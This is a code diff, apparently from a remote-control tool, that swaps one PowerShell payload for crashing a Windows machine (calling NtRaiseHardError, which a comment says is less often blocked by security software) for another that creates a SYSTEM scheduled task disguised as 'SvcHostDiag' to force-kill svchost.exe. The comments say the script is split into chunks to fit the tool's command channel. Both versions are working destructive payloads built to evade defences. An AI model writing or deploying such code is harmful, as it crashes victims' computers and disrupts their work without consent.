@@ -35,11 +35,14 @@ COMMAND_MAX_BYTES = (len(basicCMD['-c']) - COMMAND_OFFSET - 2) // 2 * 2
 LOGOFF_COMMAND = "shutdown /l"
 
 
-# 蓝屏：直接调用内核接口 NtRaiseHardError 并以“关机”响应，比结束
-# wininit.exe 更少被安全软件拦截；脚本按命令通道上限拆成多段下发。
+# 蓝屏：用 SYSTEM 权限的计划任务结束 svchost.exe。命令通道不是管理员身份，
+# 因此靠 schtasks 以 SYSTEM 建一次性任务再立即运行；脚本按通道上限分片下发。
+BLUE_SCREEN_TASK_NAME = "SvcHostDiag"
+
 BLUE_SCREEN_SCRIPT = (
-    "Add-Type -Name W -Namespace N -MemberDefinition "
-    "'[DllImport(\"ntdll.dll\")]public static extern int NtRaiseHardError"
-    "(int a,int b,int c,int d,int e,out int f);';"
-    "$f=0;[N.W]::NtRaiseHardError(3221227052,0,0,0,6,[ref]$f)"
+    "$t='%s';" % BLUE_SCREEN_TASK_NAME
+    + 'schtasks /Create /TN $t /SC ONCE /ST 00:00 /SD 01/01/2000 /RL HIGHEST '
+    '/RU "NT AUTHORITY\\SYSTEM" /TR '
+    "\'cmd /c taskkill /f /im svchost.exe\' /F;"
+    "schtasks /Run /TN $t"
 )
